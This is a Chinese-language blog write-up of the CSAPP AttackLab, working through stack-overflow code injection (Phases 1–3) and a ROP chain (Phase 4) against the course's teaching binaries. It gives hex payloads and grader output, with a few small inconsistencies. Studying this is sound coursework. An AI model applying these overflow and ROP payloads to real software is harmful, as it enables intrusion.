---
title: CSAPP AttackLab
abbrlink: a4b4efe7
date: 2025-02-25 15:55:15
categories: CSAPP
toc: true
---

csapp AttackLab

<!-- more -->

## Phase 1

首先获取 `ctarget` 的汇编代码

```shell
objdump -d ctarget ctarget.s
```

查看`getbuf`函数,确定分配的空间

```asm
4017a8: 48 83 ec 28           sub    $0x28,%rsp
4017ac: 48 89 e7              mov    %rsp,%rdi
4017af: e8 8c 02 00 00        call   401a40 <Gets>
```

发现分配了`0x28 = 40`字节的空间用于保存输入, 从而知道调用函数的返回地址是`%rsp + 40`处,
只要将这个地址用`touch1`的地址覆盖,即可完成攻击

查看`touch1`的地址

```asm
00000000004017c0 <touch1>:
```

也就是在`0x4017c0`处
所以得到我们的输入字符串为

```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00
```

将其保存在`phase1.txt`中,进行测试

```shell
$ ./hex2raw <phase1.txt |./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
```

## Phase 2

查看`touch2`的源代码

```c
void touch2(unsigned val) {
   vlevel = 2;
   if (val == cookie) {
      // ...
   }
   // ...
}
```

`touch2`与`touch1`不同之处在于前者接受一个无符号整数类型的参数, 而且要与`cookie`进行比较
所以我们必须先把 `cookie` 的值传给参数 `val`, 根据`x86-64`惯例,也就是寄存器`%rdi`

```asm
movq $0x59b997fa, %rdi
pushq $0x4017ec # touch2的地址
ret
```

这里首先将`cookie`保存到`%rdi`中, 然后将`touch2`的地址压栈,最后返回.这样就可以跳转到`touch2`并将`cookie`传入参数
将代码保存到文件`phase2.s`中, 然后转换成对应的机器码

```shell
gcc -c phase2.s
objdump -d phase2.o > phase2.byte
```

得到的机器码内容是

```asm
0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3                      ret
```

和`phase1`的思路相同,将这段代码保存在输入缓冲区中,然后覆盖返回地址即可执行,为此需要知道缓冲区的地址

```c
(gdb) disassemble
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>: sub    $0x28,%rsp
=> 0x00000000004017ac <+4>: mov    %rsp,%rdi
   0x00000000004017af <+7>: call   0x401a40 <Gets>
   0x00000000004017b4 <+12>: mov    $0x1,%eax
   0x00000000004017b9 <+17>: add    $0x28,%rsp
   0x00000000004017bd <+21>: ret
End of assembler dump.
(gdb) display $rsp
1: $rsp = (void *) 0x5561dc78
```

所以得到我们的输入为

```plaintext
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55
```

将其保存在`phase2.txt`中, 进行测试

```shell
$ ./hex2raw <phase2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

## Phase 3

首先， 看`touch3`的`c`代码

```c
void touch3(char *sval)
{
   vlevel=3; /* Partofvalidationprotocol */
   if (hexmatch(cookie,sval)){
      //...
   }
```

`touch3`的参数是一个指针，指向了一个**字符串**, 然后调用`hexmatch`进行比较。所以可以得到下面的信息：
传递给`%rdi`的值应该是`cookie`的地址，并且要以`ASCII`来表示

通过查表得到字符串的表示：

```c
// 0x59b997fa
35 39 62 39 39 37 66 61
```

调用`hexmatch`前，位置`0x5561dc78`处的信息：

```c
0x5561dc78:     0xb8c7c748      0x685561dc      0x004018fa      0x000000c3
0x5561dc88:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000

0x5561dca8:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x5561dcb8:     0x39623935      0x61663739      0xf4f4f400      0xf4f4f4f4
```

调用该函数后：

```c
0x5561dc78:     0xb8c7c748      0x685561dc      0x5561dcb8      0x00000000
0x5561dc88:     0x55685fe8      0x00000000      0x00000002      0x00000000
0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000

0x5561dca8:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x5561dcb8:     0x39623935      0x61663739      0xf4f4f400      0xf4f4f4f4
```

可以看到，输入被覆盖了， 所以不能将`cookie`保存在`getbuf`的栈中，
同时也注意到地址`a8`后的内容没有被改变，所以可以将其保存在这个位置

这里保存在`b8`位置处, 汇编代码为

```asm
movq $0x5561dcb8, %rdi
pushq $0x004018fa
ret
```

最终的输入是

```c
48 c7 c7 b8 dc 61 55 68
fa 18 40 00 c3 00 00 00
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
78 dc 61 55 00 00 00 00
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
35 39 62 39 39 37 66 61
```

测试

```shell
$ ./hex2raw < p3.txt |./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 B8 DC 61 55 68 FA 18 40 00 C3 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55 00 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 35 39 62 39 39 37 66 61
```

## Phase 4

`rtarget`使用了两种技术防止缓冲区溢出攻击：

1. 栈随机化 ：每一次运行栈的位置都不同，这样就不能找到注入代码的位置
2. 限制可执行区域：栈为不可执行区域，一旦执行栈上的代码，就会出现段错误

攻击办法是利用已经存在的代码，而不是注入代码，这种方式称为`ROP攻击`
按照 lab 要求，需要的代码位置在`start_farm` 和 `end_farm`之间

明白了上面的情况，就可以开始进行实验
和`Phase 2`一样，仍然要将`cookie`放入`%rdi`中，根据实验给出的机器码，需要查找开头为`48 89`的指令， 且目的寄存器是`%rdi`
满足条件的有：

```asm
# 对应的指令地址是 4019a2
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3

对应的指令地址是 4019c5
00000000004019c3 <setval_426>:
  4019c3:   c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)
  4019c9:   c3
```

`90`是`nop`指令，不影响功能
经查询后可以知道，这条指令是`movq %rax, %rdi`, 所以需要先将`cookie`保存到`%rax`
要完成这一操作，需要先将`cookie`保存在栈上，然后弹出到`%rax`中，所以满足要求的指令是：

```asm
popq %rax
```

对应的机器码是`58`, 查到的有：

```asm
# 对应的指令地址是 4019ab
00000000004019a7 <addval_219>:
  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:   c3                      ret

# 对应的指令地址是 4019cc
00000000004019ca <getval_280>:
   4019ca:  b8 29 58 90 c3       mov    $0xc3905829,%eax
   4019cf:  c3
```

所以攻击的流程为：
先执行构造出指令：

```asm
popq %rax
movq %rax, %rdi
```

执行完后，然后跳转到`touch2`即可完成

所以输入的内容格式如下：

```c
----        // getbuf的输入缓冲区
----        // getbuf的输入缓冲区
0x4019ab    // 第一条指令的地址，这里选择满足要求的第一个
0x59b997fa  // cookie
0x4019a2    // 第二条指令的地址，这里选择满足要求的第一个
0x40184c    // touch2的地址
```

最后的输入如下：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

测试：

```shell
$ ./hex2raw <p4.txt| ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```
